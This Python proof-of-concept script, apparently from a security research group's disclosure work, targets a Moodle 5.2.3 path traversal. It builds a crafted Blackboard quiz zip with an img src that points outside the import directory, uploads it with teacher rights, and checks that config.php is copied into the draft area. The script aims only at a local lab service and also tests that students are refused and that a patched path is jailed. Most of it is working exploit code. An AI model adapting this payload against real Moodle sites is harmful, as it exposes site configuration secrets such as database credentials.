#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: moodle-blackboard-img (Medium: 6.5)
#  Vendor: Moodle LMS (Moodle)
#  Versions: Moodle 5.2.3 (v5.2.3 344232c)
#  Impact: Teacher Blackboard img src copies files outside the import tree into the draft area
#  Requires: loopback Docker; teacher question-bank import gadget on 127.0.0.1:19560
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "moodle-blackboard-img"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Moodle v5.2.3 Blackboard img src copies config.php into the draft area."""


import hashlib
import io
import json
import urllib.error
import urllib.request
import zipfile
from pathlib import Path
from typing import Any

LABEL = "moodle-blackboard-img"
WITNESS = "MOODLE-BLACKBOARD-IMG-WITNESS"
HOST = "127.0.0.1"
PORT = 19560
PIN_TAG = "v5.2.3"
PIN_SHA = "344232c153"
PIN_RELEASE = "5.2.3 (Build: 20260914)"
JOIN_NEEDLE = "$fullpath = $this->filebase . '/' . $path;"
GET_FILECONTENT_NEEDLE = "clean_param($path, PARAM_PATH)"
STORE_NEEDLE = (
    "$fs->create_file_from_pathname($filerecord, "
    "$tempdir . '/' . $filepathinsidetempdir . '/' . $filename);"
)
HTTP_TIMEOUT_S = 12.0
HERE = Path(__file__).resolve().parent


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def http(
    path: str,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    method: str | None = None,
) -> tuple[int, bytes]:
    url = f"http://{HOST}:{PORT}{path}"
    req = urllib.request.Request(
        url,
        data=data,
        headers=headers or {},
        method=method or ("POST" if data is not None else "GET"),
    )
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT_S) as resp:
            return int(resp.status), resp.read()
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read()
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, str(exc).encode()


def http_json(path: str) -> tuple[int, dict[str, Any] | None, str]:
    status, raw = http(path)
    body = raw.decode("utf-8", "replace")
    parsed: dict[str, Any] | None = None
    try:
        loaded = json.loads(body)
    except json.JSONDecodeError:
        loaded = None
    if isinstance(loaded, dict):
        parsed = loaded
    return status, parsed, body


def blackboard_zip(img_src: str) -> bytes:
    question = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<questestinterop>\n"
        "  <assessment>\n"
        "    <section>\n"
        "      <item>\n"
        "        <itemmetadata>\n"
        "          <bbmd_questiontype>Essay</bbmd_questiontype>\n"
        "          <bbmd_asi_object_id>q1</bbmd_asi_object_id>\n"
        "        </itemmetadata>\n"
        "        <presentation>\n"
        '          <flow class="QUESTION_BLOCK">\n'
        '            <flow class="FORMATTED_TEXT_BLOCK">\n'
        "              <material>\n"
        "                <mat_extension>\n"
        "                  <mat_formattedtext><![CDATA["
        f'<p>See image</p><img src="{img_src}" alt="cfg">'
        "]]></mat_formattedtext>\n"
        "                </mat_extension>\n"
        "              </material>\n"
        "            </flow>\n"
        "          </flow>\n"
        "        </presentation>\n"
        "      </item>\n"
        "    </section>\n"
        "  </assessment>\n"
        "</questestinterop>\n"
    )
    manifest = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<manifest>\n"
        "  <resources>\n"
        '    <resource type="assessment/x-bb-qti-test" bb:file="res00001.dat"/>\n'
        "  </resources>\n"
        "</manifest>\n"
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("imsmanifest.xml", manifest)
        zf.writestr("res00001.dat", question)
    return buf.getvalue()


def multipart(
    fields: dict[str, str],
    filename: str,
    content: bytes,
) -> tuple[bytes, str]:
    boundary = "----MoodleBlackboardImgBoundary"
    chunks: list[bytes] = []
    for name, value in fields.items():
        chunks.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n'
                f"\r\n"
                f"{value}\r\n"
            ).encode()
        )
    chunks.append(
        (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="zip"; filename="{filename}"\r\n'
            f"Content-Type: application/zip\r\n"
            f"\r\n"
        ).encode()
        + content
        + b"\r\n"
    )
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), f"multipart/form-data; boundary={boundary}"


def import_zip(role: str, jail: bool, zip_bytes: bytes) -> tuple[int, dict[str, Any] | None, str]:
    body, content_type = multipart(
        {"role": role, "jail": "1" if jail else "0"},
        "bbquiz.zip",
        zip_bytes,
    )
    status, raw = http(
        "/import",
        data=body,
        headers={"Content-Type": content_type},
    )
    text = raw.decode("utf-8", "replace")
    parsed: dict[str, Any] | None = None
    try:
        loaded = json.loads(text)
    except json.JSONDecodeError:
        loaded = None
    if isinstance(loaded, dict):
        parsed = loaded
    return status, parsed, text


def main() -> int:
    log(f"IOC lab-dir={HERE.name} pin={PIN_TAG} sha={PIN_SHA}")
    status, ping, ping_body = http_json("/ping")
    log(f"IOC ping status={status} body={clip(ping_body)}")
    if status != 200 or ping is None:
        return fail("ping")
    if ping.get("pong") != "pong":
        return fail("ping-pong")
    if ping.get("tag") != PIN_TAG or ping.get("sha") != PIN_SHA:
        return fail("pin-tag")
    if PIN_RELEASE not in str(ping.get("version", "")):
        return fail("pin-release")
    if ping.get("pin_join") is not True:
        return fail("pin-join-missing")
    if ping.get("pin_get_filecontent_jailed") is not True:
        return fail("pin-get-filecontent-missing")

    status, base_raw = http("/pin/formatbase.php")
    base_text = base_raw.decode("utf-8", "replace")
    log(f"IOC pin-formatbase status={status} bytes={len(base_text)}")
    if status != 200 or JOIN_NEEDLE not in base_text:
        return fail("formatbase-join")
    if STORE_NEEDLE not in base_text:
        return fail("formatbase-store")
    if "clean_param($path, PARAM_PATH)" in base_text:
        return fail("formatbase-unexpected-path-clean")

    status, fmt_raw = http("/pin/format.php")
    fmt_text = fmt_raw.decode("utf-8", "replace")
    log(f"IOC pin-format status={status} bytes={len(fmt_text)}")
    if status != 200 or GET_FILECONTENT_NEEDLE not in fmt_text:
        return fail("format-get-filecontent")

    img_src = str(ping.get("img_src") or "")
    config_sha = str(ping.get("config_sha256") or "")
    if img_src == "" or config_sha == "":
        return fail("meta-paths")
    zip_bytes = blackboard_zip(img_src)
    log(f"IOC zip-bytes={len(zip_bytes)} img_src={img_src}")

    status, student, student_body = import_zip("student", False, zip_bytes)
    log(f"IOC student-import status={status} body={clip(student_body)}")
    if status != 403:
        return fail("student-not-403")
    if student is None or student.get("error") != "teacher-only":
        return fail("student-gate")

    status, teacher, teacher_body = import_zip("teacher", False, zip_bytes)
    log(f"IOC teacher-import status={status} body={clip(teacher_body)}")
    if status != 200 or teacher is None:
        return fail("teacher-import")
    if teacher.get("match") is not True:
        return fail("draft-not-config")
    if teacher.get("witness_in_draft") is not True:
        return fail("witness-missing")
    if teacher.get("jailed_under_filebase") is not False:
        return fail("unjailed-path-should-escape-filebase")
    if str(teacher.get("draft_sha256") or "") != config_sha:
        return fail("draft-sha-mismatch")

    itemid = str(teacher.get("itemid") or "")
    filename = str(teacher.get("draft_filename") or "")
    if itemid == "" or filename == "":
        return fail("draft-ids")
    status, draft_raw = http(f"/draft?itemid={itemid}&filename={filename}")
    log(f"IOC draft-get status={status} bytes={len(draft_raw)}")
    if status != 200:
        return fail("draft-http")
    if WITNESS not in draft_raw.decode("utf-8", "replace"):
        return fail("draft-witness")
    if hashlib.sha256(draft_raw).hexdigest() != config_sha:
        return fail("draft-bytes-not-config")

    status, jailed, jailed_body = import_zip("teacher", True, zip_bytes)
    log(f"IOC teacher-jail status={status} body={clip(jailed_body)}")
    if status != 200 or jailed is None:
        return fail("jail-import")
    if jailed.get("match") is True:
        return fail("jail-still-matched")
    if jailed.get("witness_in_draft") is True:
        return fail("jail-still-had-witness")
    if jailed.get("readable") is True:
        return fail("jail-still-readable")
    if jailed.get("jailed_under_filebase") is not True:
        return fail("jail-not-under-filebase")

    log(
        "SUCCESS "
        f"{LABEL} how=gadget pin={PIN_TAG} teacher-import=yes "
        f"draft-match-config=yes student=403 "
        f"param-path-jail=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

